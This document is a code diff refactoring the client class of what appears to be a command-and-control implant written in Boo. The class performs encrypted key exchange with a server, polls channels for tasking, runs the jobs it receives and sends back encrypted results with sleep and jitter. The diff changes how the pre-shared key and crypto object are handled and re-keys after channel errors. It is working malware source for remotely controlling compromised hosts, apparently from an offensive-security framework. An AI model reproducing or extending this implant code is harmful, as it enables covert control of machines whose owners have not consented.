@@ -451,11 +451,12 @@ class STClient:
     public Hostname = Environment.MachineName
     public Debug as bool = true
     private _Guid as Guid
-    private Crypto as Crypto
+    private _PSK as string
+    private _Crypto as Crypto
 
     public PSK:
         set:
-            Crypto = Crypto(PSK: value)
+            _PSK = value
 
     public Guid:
         set:
@@ -510,13 +511,14 @@ class STClient:
         return Sleep
 
     public def DoKex():
-        encryptedPubKey = Crypto.EncryptedPubKey
+        _Crypto = Crypto(PSK: _PSK)
+        encryptedPubKey = _Crypto.EncryptedPubKey
 
         while true:
             for channel as duck in Channels:
                 try:
                     encryptedServerPubKey = channel.KeyExchange(encryptedPubKey)
-                    Crypto.DeriveKey(encryptedServerPubKey)
+                    _Crypto.DeriveKey(encryptedServerPubKey)
                     return
                 except e as Exception:
                     if Debug:
@@ -527,35 +529,34 @@ class STClient:
 
     public def Start():
         DoKex()
-
         while true:
             for channel as duck in Channels:
                 try:
                     encrypted_job = channel.GetJob()
                     #encrypted_job = channel.GetJob.EndInvoke(job_thread)
                     if len(encrypted_job) > 0:
-                        decrypted_job = Encoding.UTF8.GetString( Crypto.Decrypt(encrypted_job) )
+                        decrypted_job = Encoding.UTF8.GetString( _Crypto.Decrypt(encrypted_job) )
                         job = JavaScriptSerializer().Deserialize[of JsonJob](decrypted_job)
                         Jobs.Add(STJob(job, self))
                 except e as Exception:
                     if Debug:
                         print "[Channel: $(channel.Name)] Error retrieving tasking: $(e.Message)"
+                    DoKex()
                     Thread.Sleep(GetSleepAndJitter())
                     continue
             Thread.Sleep(GetSleepAndJitter())
 
     public def SendJobResults(job as STJob):
-        while true:
-            for channel as duck in Channels:
-                payload = Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
-                try:
-                    channel.SendJobResults(payload, job.id)
-                    return
-                except e as Exception:
-                    if Debug:
-                        print "Error sending job (id: $(job.id)) results with $(channel.Name) channel: $(e.Message)"
-                    #Thread.Sleep(GetSleepAndJitter())
-                    continue
+        for channel as duck in Channels:
+            payload = _Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
+            try:
+                channel.SendJobResults(payload, job.id)
+                return
+            except e as Exception:
+                if Debug:
+                    print "Error sending job (id: $(job.id)) results with $(channel.Name) channel: $(e.Message)"
+                #Thread.Sleep(GetSleepAndJitter())
+                continue
             #Thread.Sleep(GetSleepAndJitter())
 
 public static def Main(argv as (string)):
